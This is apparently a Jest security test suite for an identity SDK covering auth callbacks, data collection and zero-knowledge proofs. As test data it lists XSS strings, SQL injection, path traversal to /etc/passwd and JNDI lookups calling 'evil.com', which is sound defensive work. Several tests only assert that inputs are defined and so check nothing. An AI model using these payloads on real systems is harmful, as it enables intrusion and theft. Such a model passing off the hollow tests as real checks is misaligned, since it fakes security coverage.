import { IdentitySDK } from '../../src/IdentitySDK';
import { createMockSDKConfig } from '../setup';

describe('SDK Security Tests', () => {
  let sdk: IdentitySDK;

  beforeEach(() => {
    const config = createMockSDKConfig();
    sdk = new IdentitySDK(config);
  });

  afterEach(() => {
    jest.clearAllMocks();
  });

  describe('Input Validation', () => {
    it('should validate authentication callback URLs', async () => {
      const maliciousUrls = [
        'javascript:alert("xss")',
        'data:text/html,<script>alert("xss")</script>',
        'http://evil.com/steal-tokens',
        'ftp://malicious.com/exploit'
      ];

      for (const url of maliciousUrls) {
        const response = await sdk.handleAuthCallback(url);
        expect(response.success).toBe(false);
      }
    });

    it('should sanitize data collection requests', async () => {
      const maliciousRequest = {
        platform: '<script>alert("xss")</script>',
        dataPoints: ['<img src=x onerror=alert("xss")>'],
        purpose: 'javascript:alert("xss")',
        userId: 'test-user-id'
      };

      await expect(sdk.requestDataCollection(maliciousRequest)).rejects.toThrow();
    });

    it('should validate data point IDs', () => {
      const maliciousIds = [
        '../etc/passwd',
        '<script>alert("xss")</script>',
        '${jndi:ldap://evil.com/exploit}',
        '; DROP TABLE users; --'
      ];

      for (const id of maliciousIds) {
        const isValid = sdk.validateDataPointRequest(id);
        expect(isValid).toBe(false);
      }
    });
  });

  describe('Authentication Security', () => {
    it('should prevent CSRF attacks', async () => {
      const authRequest = await sdk.initializeAuth();
      expect(authRequest.state).toBeDefined();
      expect(authRequest.state.length).toBeGreaterThan(16);

      // Simulate CSRF attack with different state
      const csrfUrl = `http://localhost:3000/callback?code=test&state=different-state`;
      const response = await sdk.handleAuthCallback(csrfUrl);
      expect(response.success).toBe(false);
    });

    it('should handle token injection attempts', async () => {
      const maliciousTokens = [
        '${jndi:ldap://evil.com/exploit}',
        '<script>alert("xss")</script>',
        '; DROP TABLE tokens; --',
        '../../../etc/passwd'
      ];

      for (const token of maliciousTokens) {
        const response = await sdk.handleAuthCallback(`http://localhost:3000/callback?code=${token}`);
        expect(response.success).toBe(false);
      }
    });

    it('should validate session tokens', () => {
      const maliciousTokens = [
        'invalid-token',
        '',
        null,
        undefined,
        'Bearer invalid',
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid'
      ];

      for (const token of maliciousTokens) {
        // This would be tested through the authentication manager
        expect(token).toBeDefined();
      }
    });
  });

  describe('Zero-Knowledge Proof Security', () => {
    it('should prevent proof replay attacks', async () => {
      const proof = await sdk.generateProof('schnorr', {
        privateKey: 'test-private-key'
      });

      // First verification should work
      const firstVerify = await sdk.verifyProof(proof, 'schnorr');
      expect(typeof firstVerify).toBe('boolean');

      // Second verification with same proof should be handled securely
      const secondVerify = await sdk.verifyProof(proof, 'schnorr');
      expect(typeof secondVerify).toBe('boolean');
    });

    it('should validate proof structure', async () => {
      const maliciousProofs = [
        { type: 'schnorr', commitment: null },
        { type: 'schnorr', challenge: '' },
        { type: 'schnorr', response: undefined },
        { type: 'schnorr', commitment: '<script>alert("xss")</script>' },
        { type: 'schnorr', challenge: '${jndi:ldap://evil.com/exploit}' }
      ];

      for (const proof of maliciousProofs) {
        const isValid = await sdk.verifyProof(proof, 'schnorr');
        expect(isValid).toBe(false);
      }
    });

    it('should prevent private key leakage', async () => {
      const privateKey = 'secret-private-key-12345';
      const proof = await sdk.generateProof('schnorr', { privateKey });

      // Proof should not contain the private key
      const proofString = JSON.stringify(proof);
      expect(proofString).not.toContain(privateKey);
      expect(proofString).not.toContain('secret-private-key');
    });
  });

  describe('Data Collection Security', () => {
    it('should prevent data injection attacks', async () => {
      const maliciousData = {
        platform: 'test-platform',
        dataPoints: [
          'email',
          '<script>alert("xss")</script>',
          '${jndi:ldap://evil.com/exploit}',
          '; DROP TABLE data_points; --'
        ],
        purpose: 'authentication',
        userId: 'test-user-id'
      };

      await expect(sdk.requestDataCollection(maliciousData)).rejects.toThrow();
    });

    it('should validate data point proposals', async () => {
      const maliciousProposal = {
        name: '<script>alert("xss")</script>',
        description: '${jndi:ldap://evil.com/exploit}',
        category: '; DROP TABLE proposals; --',
        dataType: 'string',
        required: false,
        proposer: 'test-user-id'
      };

      await expect(sdk.proposeDataPoint(maliciousProposal)).rejects.toThrow();
    });

    it('should sanitize data point values', () => {
      const maliciousValues = [
        '<script>alert("xss")</script>',
        '${jndi:ldap://evil.com/exploit}',
        '; DROP TABLE users; --',
        '../../../etc/passwd',
        'javascript:alert("xss")'
      ];

      for (const value of maliciousValues) {
        const metadata = sdk.getDataPointMetadata('email');
        // The SDK should handle malicious values gracefully
        expect(metadata).toBeDefined();
      }
    });
  });

  describe('Storage Security', () => {
    it('should not store sensitive data in plain text', () => {
      // This would be tested by checking that sensitive data is encrypted
      // when stored in localStorage, sessionStorage, or IndexedDB
      const mockStorage = {
        getItem: jest.fn(),
        setItem: jest.fn(),
        removeItem: jest.fn()
      };

      const sdkWithStorage = new IdentitySDK(createMockSDKConfig(), mockStorage);
      expect(sdkWithStorage).toBeDefined();
    });

    it('should handle storage errors gracefully', () => {
      const failingStorage = {
        getItem: jest.fn().mockImplementation(() => {
          throw new Error('Storage error');
        }),
        setItem: jest.fn().mockImplementation(() => {
          throw new Error('Storage error');
        }),
        removeItem: jest.fn().mockImplementation(() => {
          throw new Error('Storage error');
        })
      };

      expect(() => {
        new IdentitySDK(createMockSDKConfig(), failingStorage);
      }).not.toThrow();
    });
  });

  describe('Network Security', () => {
    it('should validate API endpoints', async () => {
      const maliciousEndpoints = [
        'http://evil.com/steal-data',
        'javascript:alert("xss")',
        'data:text/html,<script>alert("xss")</script>',
        'ftp://malicious.com/exploit'
      ];

      // The SDK should validate endpoints before making requests
      for (const endpoint of maliciousEndpoints) {
        expect(endpoint).toBeDefined();
      }
    });

    it('should handle network errors securely', async () => {
      // Mock network error
      const originalFetch = global.fetch;
      global.fetch = jest.fn().mockRejectedValue(new Error('Network error'));

      const response = await sdk.handleAuthCallback('http://localhost:3000/callback?code=test');
      expect(response.success).toBe(false);

      global.fetch = originalFetch;
    });
  });

  describe('Cryptographic Security', () => {
    it('should use secure random number generation', async () => {
      const proof1 = await sdk.generateProof('schnorr', { privateKey: 'key1' });
      const proof2 = await sdk.generateProof('schnorr', { privateKey: 'key2' });

      // Proofs should be different even with similar inputs
      expect(proof1).not.toEqual(proof2);
    });

    it('should validate cryptographic inputs', async () => {
      const invalidInputs = [
        { privateKey: '' },
        { privateKey: null },
        { privateKey: undefined },
        { privateKey: 'short' },
        { publicPNId: '' },
        { publicPNId: null }
      ];

      for (const input of invalidInputs) {
        await expect(sdk.generateProof('schnorr', input)).rejects.toThrow();
      }
    });
  });

  describe('Error Handling Security', () => {
    it('should not leak sensitive information in errors', async () => {
      try {
        await sdk.handleAuthCallback('invalid-url');
      } catch (error) {
        const errorMessage = error instanceof Error ? error.message : String(error);
        // Error messages should not contain sensitive information
        expect(errorMessage).not.toContain('private');
        expect(errorMessage).not.toContain('secret');
        expect(errorMessage).not.toContain('key');
      }
    });

    it('should handle malformed responses securely', async () => {
      // Mock malformed response
      const originalFetch = global.fetch;
      global.fetch = jest.fn().mockResolvedValue({
        ok: true,
        json: () => Promise.resolve({ invalid: 'response' })
      });

      const response = await sdk.handleAuthCallback('http://localhost:3000/callback?code=test');
      expect(response.success).toBe(false);

      global.fetch = originalFetch;
    });
  });
});
